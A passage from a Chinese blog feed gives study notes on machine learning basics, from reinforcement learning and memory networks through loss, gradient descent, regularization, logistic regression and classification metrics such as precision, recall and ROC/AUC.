<h2 id="理解强化学习"><a href="#理解强化学习" class="headerlink" title="理解强化学习"></a>理解强化学习</h2><p>抛开强化学习探索反馈过程，从回合的最终结果看，强化学习也是一种有监督学习。回合最终结果的输赢就是标签，如果最终结果是好的，说明之前的一系列状态动作的决策过程是有效的，反之是无效的。通过不断地学习，最终可得到较优的状态到动作地策略分布Q函数或者状态和动作的值函数。</p>
<h1 id="记忆网络"><a href="#记忆网络" class="headerlink" title="记忆网络"></a>记忆网络</h1><p>传统的深度学习模型（RNN、LSTM、GRU等）使用hidden states或者Attention机制作为他们的记忆功能，但是这种方法产生的记忆太小了，无法精确记录一段话中所表达的全部内容，也就是在将输入编码成dense vectors的时候丢失了很多信息。记忆网络采用一种可读写的外部记忆模块，并将其和inference组件联合训练，最终得到一个可以被灵活操作的记忆模块。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/人工神经网络" target="_blank" rel="noopener">人工神经网络</a>,by wikipedia.</li>
<li><a href="https://developers.google.com/machine-learning/crash-course/introduction-to-neural-networks/anatomy?hl=zh-cn" target="_blank" rel="noopener">神经网络简介</a>,by google.</li>
<li><a href="https://www.leiphone.com/news/201705/TMsNCqjpOIfN3Bjr.html" target="_blank" rel="noopener">一文详解神经网络 BP 算法原理及 Python 实现</a>,by AI研习社.</li>
<li><a href="https://google-developers.appspot.com/machine-learning/crash-course/backprop-scroll/?hl=zh-CN" target="_blank" rel="noopener">反向传播算法动态演示</a>, by google.</li>
<li><a href="https://coggle.it/diagram/Wf5mYoJbsgABUF9P/t/neural-net-arch-genealogy" target="_blank" rel="noopener">深度学习架构家谱</a>,by hunkim.</li>
<li><a href="http://zh.d2l.ai/" target="_blank" rel="noopener">动手学深度学习</a>,by d2l-zh.</li>
<li><a href="https://blog.csdn.net/Genius_zz/article/details/52804585" target="_blank" rel="noopener">神经网络之LeNet结构分析及参数详解</a>,by Genius_zz.</li>
<li><a href="https://zhuanlan.zhihu.com/p/47391705" target="_blank" rel="noopener">经典CNN结构简析：AlexNet、VGG、NIN、GoogLeNet、ResNet etc. </a>,by Uno Whoiam.</li>
<li><a href="https://zhuanlan.zhihu.com/p/41423739" target="_blank" rel="noopener">一文读懂VGG网络</a>,by Amusi.</li>
<li><a href="https://zh.wikipedia.org/wiki/生成模型" target="_blank" rel="noopener">生成模型</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/wiki/生成对抗网络" target="_blank" rel="noopener">生成对抗网络</a>,by wikipedia.</li>
<li><a href="https://poloclub.github.io/ganlab/" target="_blank" rel="noopener">GAN动态演示</a>,by poloclub.</li>
<li><a href="https://zh.wikipedia.org/wiki/强化学习" target="_blank" rel="noopener">强化学习</a>,by wikipedia.</li>
<li><a href="https://blog.csdn.net/Nicholas_Liu2017/article/details/73694666" target="_blank" rel="noopener">25张图让你读懂神经网络架构</a>, by Nicholas_Liu2017.</li>
<li><a href="https://zhuanlan.zhihu.com/p/58883095" target="_blank" rel="noopener">常见的损失函数(loss function)总结</a>,by yyHaker.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>机器学习之相关概念</title>
    <url>/2018/11/19/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5/</url>
    <content><![CDATA[<p>机器学习是人工智能的一个分支。人工智能的研究历史有着一条从以“推理”为重点，到以“知识”为重点，再到以“学习”为重点的自然、清晰的脉络。显然，机器学习是实现人工智能的一个途径，即以机器学习为手段解决人工智能中的问题。</p>
<h1 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h1><p>机器学习有下面几种定义：</p>
<ul>
<li>机器学习是一门人工智能的科学，该领域的主要研究对象是人工智能，特别是如何在经验学习中改善具体算法的性能。</li>
<li>机器学习是对能通过经验自动改进的计算机算法的研究。</li>
<li>机器学习是用数据或以往的经验，以此优化计算机程序的性能标准。</li>
</ul>
<p>一种经常引用的英文定义是：A computer program is said to learn from experience E with respect to some class of tasks T and performance measure P, if its performance at tasks in T, as measured by P, improves with experience E.</p>
<h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><p>机器学习可以分成下面几种类别：</p>
<ul>
<li>监督学习：从给定的训练数据集中学习出一个函数，当新的数据到来时，可以根据这个函数预测结果。监督学习的训练集要求是包括输入和输出，也可以说是特征和目标。训练集中的目标是由人标注的。常见的监督学习算法包括回归分析和统计分类。</li>
</ul>
<p>监督学习和非监督学习的差别就是训练集目标是否人标注。他们都有训练集且都有输入和输出。</p>
<ul>
<li>无监督学习：与监督学习相比，训练集没有人为标注的结果。常见的无监督学习算法有生成对抗网络（GAN）、聚类。</li>
<li>半监督学习：介于监督学习与无监督学习之间。</li>
<li>强化学习：通过观察来学习做成如何的动作。每个动作都会对环境有所影响，学习对象根据观察到的周围环境的反馈来做出判断。</li>
</ul>
<h1 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h1><p>具体的机器学习算法有：</p>
<ul>
<li>构造间隔理论分布：聚类分析和模式识别<ul>
<li>人工神经网络</li>
<li>决策树</li>
<li>感知器</li>
<li>支持向量机</li>
<li>集成学习AdaBoost</li>
<li>降维与度量学习</li>
<li>聚类</li>
<li>贝叶斯分类器</li>
</ul>
</li>
<li>构造条件概率：回归分析和统计分类<ul>
<li>高斯过程回归</li>
<li>线性判别分析</li>
<li>最近邻居法</li>
<li>径向基函数核</li>
</ul>
</li>
<li>通过再生模型构造概率密度函数：<ul>
<li>最大期望算法</li>
<li>概率图模型：包括贝叶斯网和Markov随机场</li>
<li>Generative Topographic Mapping</li>
</ul>
</li>
<li>近似推断技术：<ul>
<li>马尔可夫链</li>
<li>蒙特卡罗方法</li>
<li>变分法</li>
</ul>
</li>
<li>最优化：大多数以上方法，直接或者间接使用最优化算法。</li>
</ul>
<h1 id="机器学习基础"><a href="#机器学习基础" class="headerlink" title="机器学习基础"></a>机器学习基础</h1><h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><p>标签是我们要预测的事物，即简单线性回归中的 y 变量。标签可以是小麦未来的价格、图片中显示的动物品种、音频剪辑的含义或任何事物。</p>
<h2 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h2><p>特征是输入变量，即简单线性回归中的 x 变量。简单的机器学习项目可能会使用单个特征，而比较复杂的机器学习项目可能会使用数百万个特征，按如下方式指定：<br>$${ x_1,x_2,…x_N } $$</p>
<p>在垃圾邮件检测器示例中，特征可能包括：</p>
<ul>
<li>电子邮件文本中的字词</li>
<li>发件人的地址</li>
<li>发送电子邮件的时段</li>
<li>电子邮件中包含“一种奇怪的把戏”这样的短语。</li>
</ul>
<h2 id="样本"><a href="#样本" class="headerlink" title="样本"></a>样本</h2><p>样本是指数据的特定实例：x。（我们采用粗体 x 表示它是一个矢量。）我们将样本分为以下两类：</p>
<ul>
<li>有标签样本</li>
<li>无标签样本</li>
</ul>
<p>有标签样本同时包含特征和标签，常用于训练模型。。即：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">labeled examples: &#123;features, label&#125;: (x, y)</span><br></pre></td></tr></table></figure>
<p>无标签样本包含特征，但不包含标签，常用于模型预测。即：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unlabeled examples: &#123;features, ?&#125;: (x, ?)</span><br></pre></td></tr></table></figure>

<h2 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h2><p>模型定义了特征与标签之间的关系。例如，垃圾邮件检测模型可能会将某些特征与“垃圾邮件”紧密联系起来。我们来重点介绍一下模型生命周期的两个阶段：</p>
<ul>
<li><p>训练表示创建或学习模型。向模型展示有标签样本，让模型逐渐学习特征与标签之间的关系。</p>
</li>
<li><p>推断表示将训练后的模型应用于无标签样本。使用训练后的模型来做出有用的预测 (y’)。</p>
</li>
</ul>
<h2 id="回归与分类"><a href="#回归与分类" class="headerlink" title="回归与分类"></a>回归与分类</h2><p>回归模型可预测连续值。例如，回归模型做出的预测可回答如下问题：</p>
<ul>
<li><p>加利福尼亚州一栋房产的价值是多少？</p>
</li>
<li><p>用户点击此广告的概率是多少？</p>
</li>
</ul>
<p>分类模型可预测离散值。例如，分类模型做出的预测可回答如下问题：</p>
<ul>
<li><p>某个指定电子邮件是垃圾邮件还是非垃圾邮件？</p>
</li>
<li><p>这是一张狗、猫还是仓鼠图片？</p>
</li>
</ul>
<h2 id="损失"><a href="#损失" class="headerlink" title="损失"></a>损失</h2><p>训练模型表示通过有标签样本来学习（确定）所有权重和偏差的理想值。在监督式学习中，机器学习算法通过以下方式构建模型：检查多个样本并尝试找出可最大限度地减少损失的模型；这一过程称为经验风险最小化。</p>
<p>损失是对糟糕预测的惩罚。也就是说，损失是一个数值，表示对于单个样本而言模型预测的准确程度。如果模型的预测完全准确，则损失为零，否则损失会较大。训练模型的目标是从所有样本中找到一组平均损失“较小”的权重和偏差。</p>
<p>平方损失：又称为 $L_2$ 损失,一种常见的损失函数。例如单个样本的平方损失如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D; the square of the difference between the label and the prediction</span><br><span class="line">&#x3D; (observation - prediction(x))^2</span><br><span class="line">&#x3D; (y - y&#39;)^2</span><br></pre></td></tr></table></figure>

<p>均方误差 (MSE) 指的是每个样本的平均平方损失。要计算 MSE，请求出各个样本的所有平方损失之和，然后除以样本数量：<br>$$<br>MSE = \frac{1}{N} \sum_{(x,y)\in D} (y - prediction(x))^2<br>$$</p>
<p>其中：</p>
<ul>
<li>(x,y)指的是样本，其中<ul>
<li>x指的是模型进行预测时使用的特征集（例如，温度、年龄和交配成功率）。</li>
<li>y指的是样本的标签（例如，每分钟的鸣叫次数）。</li>
</ul>
</li>
<li>prediction(x)指的是权重和偏差与特征集 x 结合的函数。</li>
<li>D指的是包含多个有标签样本（即 (x,y)）的数据集。</li>
<li>N指的是D中的样本数量。</li>
</ul>
<h2 id="迭代方法"><a href="#迭代方法" class="headerlink" title="迭代方法"></a>迭代方法</h2><p>下图显示了机器学习算法用于训练模型的迭代试错过程：</p>
<p align="center">
    <img src="images/GradientDescentDiagram.svg" width="90%" alt="用于训练模型的迭代方法"/>
</p>
<center>图1 用于训练模型的迭代方法</center>

<h3 id="梯度下降法"><a href="#梯度下降法" class="headerlink" title="梯度下降法"></a>梯度下降法</h3><p>计算参数更新的目标是在模型的迭代试错过程中，使损失越来越小。而常用的方法就是梯度下降法。</p>
<p align="center">
    <img src="images/convex.svg" width="90%" alt="回归问题产生的损失与权重图为凸形"/>
</p>
<center>图2 回归问题产生的损失与权重图为凸形</center>

<p>对于图2所示的凸形问题，刚好存在一个斜率正好为 0 的位置，即是损失函数的收敛之处。梯度下降法的第一个阶段是为$w_1$ 选择一个起始值（起点）。</p>
<p>然后，梯度下降法算法会计算损失曲线在起点处的梯度。简而言之，梯度是偏导数的矢量；它可以让您了解哪个方向距离目标“更近”或“更远”。</p>
<p>请注意，梯度是一个矢量，因此具有以下两个特征：</p>
<ul>
<li>方向</li>
<li>大小</li>
</ul>
<p>梯度始终指向损失函数中增长最为迅猛的方向。梯度下降法算法会沿着负梯度的方向走一步，以便尽快降低损失。</p>
<p>为了确定损失函数曲线上的下一个点，梯度下降法算法会将梯度大小的一部分与起点相加，如图3所示：</p>
<p align="center">
    <img src="images/GradientDescentGradientStep.svg" width="90%" alt="一个梯度步长将我们移动到损失曲线上的下一个点"/>
</p>
<center>图3 一个梯度步长将我们移动到损失曲线上的下一个点</center>

<p>然后，梯度下降法会重复此过程，逐渐接近最低点。</p>
<h3 id="学习速率"><a href="#学习速率" class="headerlink" title="学习速率"></a>学习速率</h3><p>梯度下降法算法用梯度乘以一个称为<strong>学习速率</strong>（有时也称为步长）的标量，以确定下一个点的位置。例如，如果梯度大小为 2.5，学习速率为 0.01，则梯度下降法算法会选择距离前一个点 0.025 的位置作为下一个点。</p>
<p><strong>超参数</strong>是编程人员在机器学习算法中用于调整的旋钮。大多数机器学习编程人员会花费相当多的时间来调整学习速率。如果您选择的学习速率过小，就会花费太长的学习时间。如果您指定的学习速率过大，下一个点将永远在 U 形曲线的底部随意弹跳。</p>
<h3 id="随机梯度下降法"><a href="#随机梯度下降法" class="headerlink" title="随机梯度下降法"></a>随机梯度下降法</h3><p>在梯度下降法中，<strong>批量</strong>指的是用于在单次迭代中计算梯度的样本总数。到目前为止，我们一直假定批量是指整个数据集。就 Google 的规模而言，数据集通常包含数十亿甚至数千亿个样本。此外，Google 数据集通常包含海量特征。因此，一个批量可能相当巨大。如果是超大批量，则单次迭代就可能要花费很长时间进行计算。</p>
<p>通过从我们的数据集中随机选择样本，我们可以通过小得多的数据集估算（尽管过程非常杂乱）出较大的平均值。 随机梯度下降法 (SGD) 将这种想法运用到极致，它每次迭代只使用一个样本（批量大小为 1）。如果进行足够的迭代，SGD 也可以发挥作用，但过程会非常杂乱。“随机”这一术语表示构成各个批量的一个样本都是随机选择的。</p>
<p>小批量随机梯度下降法（小批量 SGD）是介于全批量迭代与 SGD 之间的折衷方案。小批量通常包含 10-1000 个随机选择的样本。小批量 SGD 可以减少 SGD 中的杂乱样本数量，但仍然比全批量更高效。</p>
<h2 id="泛化-Generalization"><a href="#泛化-Generalization" class="headerlink" title="泛化(Generalization)"></a>泛化(Generalization)</h2><p>泛化是指机器学习对从真实概率分布（已隐藏）中抽取的新数据做出良好预测的能力。要取得良好的泛化能力，机器学习必须满足以下基本假设，同时防止过拟合。</p>
<ul>
<li><p>机器学习的基本假设：</p>
<ul>
<li>从分布中随机抽取独立同分布 (i.i.d) 的样本。换言之，样本之间不会互相影响。（另一种解释：i.i.d. 是表示变量随机性的一种方式）。</li>
<li>分布是平稳的；即分布在数据集内不会发生变化。</li>
<li>从同一分布的数据划分中抽取样本。</li>
</ul>
</li>
<li><p><strong>过拟合</strong>模型在训练过程中产生的损失很低，但在预测新数据方面的表现却非常糟糕。</p>
</li>
</ul>
<h2 id="训练集与测试集"><a href="#训练集与测试集" class="headerlink" title="训练集与测试集"></a>训练集与测试集</h2><p>机器学习模型旨在根据以前未见过的新数据做出良好预测。但是，如果您要根据数据集构建模型，如何获得以前未见过的数据呢？一种方法是将您的数据集分成两个子集：</p>
<ul>
<li>训练集 - 用于训练模型的子集。</li>
<li>测试集 - 用于测试模型的子集。</li>
</ul>
<p>测试集应满足以下两个条件：</p>
<ul>
<li>规模足够大，可产生具有统计意义的结果。</li>
<li>能代表整个数据集。换言之，挑选的测试集的特征应该与训练集的特征相同。</li>
</ul>
<h2 id="验证集"><a href="#验证集" class="headerlink" title="验证集"></a>验证集</h2><p>将数据集划分为训练集和测试集两个子集是个不错的想法，但不是万能良方。通过将数据集划分为训练集、验证集、测试集三个子集，可以大幅降低过拟合的发生几率。</p>
<p>使用验证集评估训练集的效果。然后，在模型“通过”验证集之后，使用测试集再次检查评估结果。图4展示了这一新工作流程：</p>
<p align="center">
    <img src="images/WorkflowWithValidationSet.svg" width="90%" alt="使用验证集的工作流程"/>
</p>
<center>图4 使用验证集的工作流程</center>

<h2 id="特征表示"><a href="#特征表示" class="headerlink" title="特征表示"></a>特征表示</h2><p>特征工程指的是将原始数据转换为特征矢量。进行特征工程预计需要大量时间。</p>
<ul>
<li>映射数值: 机器学习模型根据浮点值进行训练，因此整数和浮点原始数据不需要特殊编码。</li>
<li>映射字符串值: 首先为要表示的所有特征的字符串值定义一个词汇表。然后使用该词汇表创建一个独热编码，用于将指定字符串值表示为二元矢量。</li>
<li>映射分类（枚举）值</li>
</ul>
<p align="center">
    <img src="images/OneHotEncoding.svg" width="90%" alt="通过独热编码映射字符串值"/>
</p>
<center>图5 通过独热编码映射字符串值</center>

<h3 id="良好特征的特点"><a href="#良好特征的特点" class="headerlink" title="良好特征的特点"></a>良好特征的特点</h3><ul>
<li>避免很少使用的离散特征值。</li>
</ul>
<p>良好的特征值应该在数据集中出现大约 5 次以上。这样一来，模型就可以学习该特征值与标签是如何关联的。</p>
<ul>
<li>最好具有清晰明确的含义。</li>
</ul>
<p>每个特征对于项目中的任何人来说都应该具有清晰明确的含义。例如，下面的房龄适合作为特征，可立即识别为年龄：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">house_age: 27</span><br></pre></td></tr></table></figure>

<ul>
<li>不要将“神奇”的值与实际数据混为一谈</li>
</ul>
<p>良好的浮点特征不包含超出范围的异常断点或“神奇”的值。例如，假设一个特征具有 0 到 1 之间的浮点值。那么，如下值是可以接受的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">quality_rating: 0.82</span><br><span class="line">quality_rating: 0.37</span><br></pre></td></tr></table></figure>
<p>不过，如果用户没有输入 quality_rating，则数据集可能使用如下神奇值来表示不存在该值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">quality_rating: -1</span><br></pre></td></tr></table></figure>

<p>为解决神奇值的问题，需将该特征转换为两个特征：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一个特征只存储质量评分，不含神奇值。</span><br><span class="line"></span><br><span class="line">一个特征存储布尔值，表示是否提供了 quality_rating。为该布尔值特征指定一个名称，例如 is_quality_rating_defined。</span><br></pre></td></tr></table></figure>
<ul>
<li>考虑上游不稳定性</li>
</ul>
<p>特征的定义不应随时间发生变化。例如，下列值是有用的，因为城市名称一般不会改变。（注意，我们仍然需要将“br/sao_paulo”这样的字符串转换为独热矢量。）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">city_id: &quot;br&#x2F;sao_paulo&quot;</span><br></pre></td></tr></table></figure>
<p>但收集由其他模型推理的值会产生额外成本。可能值“219”目前代表圣保罗，但这种表示在未来运行其他模型时可能轻易发生变化：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inferred_city_cluster: &quot;219&quot;</span><br></pre></td></tr></table></figure>

<h3 id="清理数据"><a href="#清理数据" class="headerlink" title="清理数据"></a>清理数据</h3><p>即使是非常少量的坏样本会破坏掉一个大规模数据集，因此需花费大量的时间挑出坏样本并加工可以挽救的样本。</p>
<ol>
<li><p>缩放特征值: 缩放是指将浮点特征值从自然范围（例如 100 到 900）转换为标准范围（例如 0 到 1 或 -1 到 +1）。如果特征集包含多个特征，则缩放特征可以带来以下优势：</p>
<ul>
<li>帮助梯度下降法更快速地收敛。</li>
<li>帮助避免“NaN 陷阱”。</li>
<li>帮助模型为每个特征确定合适的权重。</li>
</ul>
</li>
<li><p>处理极端离群值</p>
<ul>
<li>对每个值取对数</li>
<li>将最大值“限制”为某个任意值</li>
</ul>
</li>
<li><p>分箱</p>
</li>
<li><p>清查</p>
</li>
</ol>
<p>数据集中的很多样本是不可靠的，原因有以下一种或多种：</p>
<ul>
<li>遗漏值。 例如，有人忘记为某个房屋的年龄输入值。</li>
<li>重复样本。 例如，服务器错误地将同一条记录上传了两次。</li>
<li>不良标签。 例如，有人错误地将一颗橡树的图片标记为枫树。</li>
<li>不良特征值。 例如，有人输入了多余的位数，或者温度计被遗落在太阳底下。</li>
</ul>
<h2 id="正则化"><a href="#正则化" class="headerlink" title="正则化"></a>正则化</h2><p>图6泛化曲线显示的是训练集和验证集相对于训练迭代次数的损失。</p>
<p align="center">
    <img src="images/RegularizationTwoLossFunctions.svg" width="90%" alt="训练集和验证集损失"/>
</p>
<center>图6 训练集和验证集损失</center>

<p>图6显示的是某个模型的训练损失逐渐减少，但验证损失最终增加。换言之，该泛化曲线显示该模型与训练集中的数据过拟合。根据奥卡姆剃刀定律，或许我们可以通过降低复杂模型的复杂度来防止过拟合，这种原则称为正则化。</p>
<p>正则化以最小化损失和复杂度为目标，这称为结构风险最小化：<br>$$\text{minimize(Loss(Data|Model) + complexity(Model))}$$</p>
<p>现在，训练优化算法是一个由两项内容组成的函数：一个是损失项，用于衡量模型与数据的拟合度，另一个是正则化项，用于衡量模型复杂度。</p>
<p>有两种常用衡量模型复杂度的方法：</p>
<ul>
<li>将模型复杂度作为模型中所有特征的权重的函数。</li>
<li>将模型复杂度作为具有非零权重的特征总数的函数。</li>
</ul>
<p>如果模型复杂度是权重的函数，则特征权重的绝对值越高，对模型复杂度的贡献就越大。</p>
<h3 id="L2正则化"><a href="#L2正则化" class="headerlink" title="L2正则化"></a>L2正则化</h3><p>可以使用 L2 正则化公式来量化复杂度，该公式将正则化项定义为所有特征权重的平方和：<br>$$L_2\text{ regularization term} = ||\boldsymbol w||_2^2 = {w_1^2 + w_2^2 + … + w_n^2}$$</p>
<p>在这个公式中，接近于 0 的权重对模型复杂度几乎没有影响，而离群值权重则可能会产生巨大的影响。</p>
<p>模型开发者通过以下方式来调整正则化项的整体影响：用正则化项的值乘以名为 lambda（又称为正则化率）的标量。也就是说，模型开发者会执行以下运算：</p>
<p>$$\text{minimize(Loss(Data|Model)} + \lambda \text{ complexity(Model))}$$</p>
<p>执行 L2 正则化对模型具有以下影响:</p>
<ul>
<li>使权重值接近于 0（但并非正好为 0）</li>
<li>使权重的平均值接近于 0，且呈正态（钟形曲线或高斯曲线）分布。</li>
</ul>
<p>在选择 lambda 值时，目标是在简单化和训练数据拟合之间达到适当的平衡：</p>
<ul>
<li><p>如果您的 lambda 值过高，则模型会非常简单，但是您将面临数据欠拟合的风险。您的模型将无法从训练数据中获得足够的信息来做出有用的预测。</p>
</li>
<li><p>如果您的 lambda 值过低，则模型会比较复杂，并且您将面临数据过拟合的风险。您的模型将因获得过多训练数据特点方面的信息而无法泛化到新数据。</p>
</li>
</ul>
<h3 id="L1正则化"><a href="#L1正则化" class="headerlink" title="L1正则化"></a>L1正则化</h3><p>稀疏矢量通常包含许多维度。创建特征组合会导致包含更多维度。由于使用此类高维度特征矢量，因此模型可能会非常庞大，并且需要大量的 RAM。</p>
<p>在高维度稀疏矢量中，最好尽可能使权重正好降至 0。正好为 0 的权重基本上会使相应特征从模型中移除。 将特征设为 0 可节省 RAM 空间，且可以减少模型中的噪点。</p>
<p>L1 正则化使模型中很多信息缺乏的系数正好为 0，从而在推理时节省 RAM，同时具有凸优化的优势，可有效进行计算。</p>
<p>L2 和 L1 采用不同的方式降低权重：</p>
<ul>
<li>L2 会降低权重<sup>2</sup>。</li>
<li>L1 会降低 |权重|。</li>
</ul>
<p>因此，L2 和 L1 具有不同的导数：</p>
<ul>
<li>L2 的导数为 2 * 权重。</li>
<li>L1 的导数为 k（一个常数，其值与权重无关）。</li>
</ul>
<h2 id="逻辑回归"><a href="#逻辑回归" class="headerlink" title="逻辑回归"></a>逻辑回归</h2><p>许多问题需要将概率估算值作为输出。逻辑回归是一种极其高效的概率计算机制。实际上，您可以通过下两种方式之一使用返回的概率：</p>
<ul>
<li>“按原样”</li>
<li>转换成二元类别。</li>
</ul>
<p>在很多情况下，您会将逻辑回归输出映射到二元分类问题的解决方案，该二元分类问题的目标是正确预测两个可能的标签（例如，“垃圾邮件”或“非垃圾邮件”）中的一个。</p>
<p>您可能想知道逻辑回归模型如何确保输出值始终落在 0 和 1 之间。巧合的是，S 型函数生成的输出值正好具有这些特性，其定义如下：</p>
<p>$$y = \frac{1}{1 + e^{-z}}$$</p>
<p>S 型函数会产生以下曲线图：</p>
<p align="center">
    <img src="images/SigmoidFunction.png" width="90%" alt="S 型函数"/>
</p>
<center>图7 S 型函数</center>

<p>如果 z 表示使用逻辑回归训练的模型的线性层的输出，则 S 型(z) 函数会生成一个介于 0 和 1 之间的值（概率）。用数学方法表示为：</p>
<p>$$y’ = \frac{1}{1 + e^{-(z)}}$$</p>
<p>其中：</p>
<ul>
<li>y’ 是逻辑回归模型针对特定样本的输出。</li>
<li>z 是 b + w<sub>1</sub>x<sub>1</sub> + w<sub>2</sub>x<sub>2</sub> + … w<sub>N</sub>x<sub>N</sub><ul>
<li>“w”值是该模型学习的权重和偏差。</li>
<li>“x”值是特定样本的特征值。</li>
</ul>
</li>
</ul>
<p>请注意，z 也称为对数几率，因为 S 型函数的反函数表明，z 可定义为标签“1”（例如“狗叫”）的概率除以标签“0”（例如“狗不叫”）的概率得出的值的对数：<br>$$z = log(\frac{y}{1-y})$$</p>
<h3 id="逻辑回归模型训练"><a href="#逻辑回归模型训练" class="headerlink" title="逻辑回归模型训练"></a>逻辑回归模型训练</h3><p>线性回归的损失函数是平方损失。逻辑回归的损失函数是对数损失函数，定义如下：<br>$$Log Loss = \sum_{(x,y)\in D} -ylog(y’) - (1 - y)log(1 - y’)$$</p>
<p>其中：</p>
<ul>
<li>(xy)ϵD 是包含很多有标签样本 (x,y) 的数据集。</li>
<li>“y”是有标签样本中的标签。由于这是逻辑回归，因此“y”的每个值必须是 0 或 1。</li>
<li>“y’”是对于特征集“x”的预测值（介于 0 和 1 之间）。</li>
</ul>
<p>对数损失函数的方程式与 Shannon 信息论中的熵测量密切相关。它也是似然函数的负对数（假设“y”属于伯努利分布）。实际上，最大限度地降低损失函数的值会生成最大的似然估计值。</p>
<p>正则化在逻辑回归建模中极其重要。如果没有正则化，逻辑回归的渐近性会不断促使损失在高维度空间内达到 0。因此，大多数逻辑回归模型会使用以下两个策略之一来降低模型复杂性：</p>
<ul>
<li>L2 正则化。</li>
<li>早停法，即，限制训练步数或学习速率。</li>
</ul>
<h2 id="分类-1"><a href="#分类-1" class="headerlink" title="分类"></a>分类</h2><h3 id="指定阈值"><a href="#指定阈值" class="headerlink" title="指定阈值"></a>指定阈值</h3><p>为了将逻辑回归值映射到二元类别，您必须指定分类阈值（也称为判定阈值）。如果值高于该阈值，则表示“垃圾邮件”；如果值低于该阈值，则表示“非垃圾邮件”。人们往往会认为分类阈值应始终为 0.5，但阈值取决于具体问题，因此您必须对其进行调整。</p>
<h3 id="真与假以及正类别与负类别"><a href="#真与假以及正类别与负类别" class="headerlink" title="真与假以及正类别与负类别"></a>真与假以及正类别与负类别</h3><ul>
<li>真正例是指模型将正类别样本正确地预测为正类别。</li>
<li>真负例是指模型将负类别样本正确地预测为负类别。</li>
<li>假正例是指模型将负类别样本错误地预测为正类别</li>
<li>假负例是指模型将正类别样本错误地预测为负类别。</li>
</ul>
<h3 id="准确率"><a href="#准确率" class="headerlink" title="准确率"></a>准确率</h3><p>准确率是一个用于评估分类模型的指标。通俗来说，准确率是指我们的模型预测正确的结果所占的比例。正式点说，准确率的定义如下：</p>
<p>$$\text{Accuracy} = \frac{\text{Number of correct predictions}}{\text{Total number of predictions}}$$</p>
<p>对于二元分类，也可以根据正类别和负类别按如下方式计算准确率：</p>
<p>$$\text{Accuracy} = \frac{TP+TN}{TP+TN+FP+FN}$$</p>
<p>其中，TP = 真正例，TN = 真负例，FP = 假正例，FN = 假负例。</p>
<h3 id="精确率和召回率"><a href="#精确率和召回率" class="headerlink" title="精确率和召回率"></a>精确率和召回率</h3><p>当使用分类不平衡的数据集（比如正类别标签和负类别标签的数量之间存在明显差异）时，单单准确率一项并不能反映全面情况。这时需要能够更好地评估分类不平衡问题的指标：精确率和召回率。</p>
<p>精确率的定义如下：<br>$$\text{Precision} = \frac{TP}{TP+FP}$$</p>
<p>从数学上讲，召回率的定义如下：<br>$$\text{Recall} = \frac{TP}{TP+FN}$$</p>
<p>要全面评估模型的有效性，必须同时检查精确率和召回率。遗憾的是，精确率和召回率往往是此消彼长的情况。</p>
<h3 id="ROC-和曲线下面积"><a href="#ROC-和曲线下面积" class="headerlink" title="ROC 和曲线下面积"></a>ROC 和曲线下面积</h3><p>ROC 曲线（接收者操作特征曲线）是一种显示分类模型在所有分类阈值下的效果的图表。该曲线绘制了以下两个参数：</p>
<ul>
<li>真正例率</li>
<li>假正例率</li>
</ul>
<p>真正例率 (TPR) 是召回率的同义词，因此定义如下：</p>
<p>$$TPR = \frac{TP} {TP + FN}$$</p>
<p>假正例率 (FPR) 的定义如下：</p>
<p>$$FPR = \frac{FP} {FP + TN}$$</p>
<p>ROC 曲线用于绘制采用不同分类阈值时的 TPR 与 FPR。降低分类阈值会导致将更多样本归为正类别，从而增加假正例和真正例的个数。下图显示了一个典型的 ROC 曲线。</p>
<p align="center">
    <img src="images/ROCCurve.svg" width="90%" alt="不同分类阈值下的 TP 率与 FP 率"/>
</p>
<center>图8 不同分类阈值下的 TP 率与 FP 率</center>

<p>曲线下面积表示“ROC 曲线下面积”。也就是说，曲线下面积测量的是从 (0,0) 到 (1,1) 之间整个 ROC 曲线以下的整个二维面积（参考积分学）。</p>
<p align="center">
    <img src="images/AUC.svg" width="90%" alt="曲线下面积（ROC 曲线下面积）"/>
</p>
<center>图9 曲线下面积（ROC 曲线下面积）</center>

<p>曲线下面积对所有可能的分类阈值的效果进行综合衡量。曲线下面积的一种解读方式是看作模型将某个随机正类别样本排列在某个随机负类别样本之上的概率。</p>
<p>曲线下面积的取值范围为 0-1。预测结果 100% 错误的模型的曲线下面积为 0.0；而预测结果 100% 正确的模型的曲线下面积为 1.0。</p>
<p>曲线下面积因以下两个原因而比较实用：</p>
<ul>
<li>曲线下面积的尺度不变。它测量预测的排名情况，而不是测量其绝对值。</li>
<li>曲线下面积的分类阈值不变。它测量模型预测的质量，而不考虑所选的分类阈值。</li>
</ul>
<p>不过，这两个原因都有各自的局限性，这可能会导致曲线下面积在某些用例中不太实用：</p>
<ul>
<li><p>并非总是希望尺度不变。 例如，有时我们非常需要被良好校准的概率输出，而曲线下面积无法告诉我们这一结果。</p>
</li>
<li><p>并非总是希望分类阈值不变。 在假负例与假正例的代价存在较大差异的情况下，尽量减少一种类型的分类错误可能至关重要。例如，在进行垃圾邮件检测时，您可能希望优先考虑尽量减少假正例（即使这会导致假负例大幅增加）。对于此类优化，曲线下面积并非一个实用的指标。</p>
</li>
</ul>
